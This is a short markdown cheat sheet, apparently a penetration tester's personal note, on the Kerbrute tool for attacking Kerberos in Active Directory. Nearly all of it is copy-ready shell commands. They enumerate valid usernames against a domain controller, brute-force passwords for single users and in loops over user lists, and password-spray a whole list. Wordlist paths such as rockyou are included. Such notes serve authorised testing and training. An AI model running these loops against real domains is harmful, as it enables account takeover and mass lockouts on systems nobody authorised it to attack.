---
tags:
---
# kerbrute

Bruteforce Kerberos - [Kerbrute](https://github.com/ropnop/kerbrute)

## Capabilities

```bash
# Brute force valid usernames
./kerbrute userenum -d $DOMAIN --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > kerbrute.out
cat kerbrute.out | grep VALID | awk '{print $7}' | cut -d @ -f 1 > users.txt

./kerbrute userenum -d $DOMAIN --dc $IP users.txt -v

# Brute force passwords for a given user
./kerbrute bruteuser -d $DOMAIN --dc $IP /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt jdoe
while IFS= read -r user; do ./kerbrute bruteuser -d $DOMAIN --dc $IP /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $user; done < users.txt

# Password spray for a given user list
./kerbrute passwordspray -d $DOMAIN --dc $IP users.txt $PASSWD
while IFS= read -r password; do ./kerbrute passwordspray -d $DOMAIN --dc $IP users.txt $password; done < passwords.txt
```

### Wordlists

```bash
# Usernames
/usr/share/seclists/Usernames/Names/names.txt # 10177 lines
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt # 8295455 lines

# Passwords (short)
/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt # 197 lines

# Passwords (long)
/usr/share/wordlists/rockyou.txt # 14344392 lines
```